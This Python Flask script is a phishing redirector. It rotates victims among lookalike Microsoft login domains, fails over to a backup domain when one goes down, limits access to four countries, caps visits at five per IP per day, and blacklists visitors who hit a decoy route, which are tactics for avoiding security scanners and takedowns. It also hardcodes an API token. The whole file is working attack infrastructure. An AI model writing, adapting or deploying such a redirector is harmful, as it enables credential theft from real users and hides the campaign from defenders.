from flask import Flask, redirect, request, abort
import requests
import time
from threading import Thread
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# IP info API token
ipinfo_api_token = '0bafd53a97d233'

# Setup rate limiter to limit requests per IP to 5 requests per day
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["5 per day"]
)

# IP blocking list and Geo-blocking logic
blocked_ips = {"bad_ip_1", "bad_ip_2"}  # Add known malicious IPs
allowed_countries = {"AU", "US", "CA", "GB"}  # Allow Australia, US, Canada, and UK

# Links to rotate
primary_links = [
    "https://microsoft-login.serv00.net/",
    "https://microsoft0365.serv00.net/"
]

# Backup link
backup_link = "https://microsoft-team.serv00.net/"

# Decoy link
decoy_link = "https://decoy-link.serv00.net/"

# Initial settings
current_link_index = 0
last_rotation_time = time.time()

# Function to rotate links
def rotate_links():
    global current_link_index, last_rotation_time
    while True:
        if time.time() - last_rotation_time >= 360:  # 6 minutes
            current_link_index = (current_link_index + 1) % len(primary_links)
            last_rotation_time = time.time()
        time.sleep(1)

# Function to check link status
def check_link_status(url):
    try:
        response = requests.head(url, timeout=5)
        return response.status_code < 400
    except requests.RequestException:
        return False

# Geo-blocking logic using ipinfo.io API
def get_country_from_ip(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json?token={ipinfo_api_token}")
        if response.status_code == 200:
            return response.json().get('country')
    except requests.RequestException:
        return None
    return None

# Background thread to rotate links
rotation_thread = Thread(target=rotate_links)
rotation_thread.daemon = True
rotation_thread.start()

@app.before_request
def block_bad_ips_and_geos():
    ip_address = get_remote_address()

    # Block known bad IPs
    if ip_address in blocked_ips:
        abort(403)

    # Implement Geo-blocking
    country = get_country_from_ip(ip_address)
    if country and country not in allowed_countries:
        abort(403)

    # Check for access to decoy link
    if request.path == '/decoy':
        blocked_ips.add(ip_address)
        abort(403)

@app.route('/')
@limiter.limit("5 per day")
def redirect_user():
    global current_link_index

    # Check if the current primary link is healthy
    if not check_link_status(primary_links[current_link_index]):
        return redirect(backup_link, code=302)
    
    return redirect(primary_links[current_link_index], code=302)

# Decoy route to trap malicious actors
@app.route('/decoy')
def decoy():
    # This route acts as a decoy and blocks the IP
    ip_address = get_remote_address()
    blocked_ips.add(ip_address)
    return redirect(decoy_link, code=302)

# Run the Flask app
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
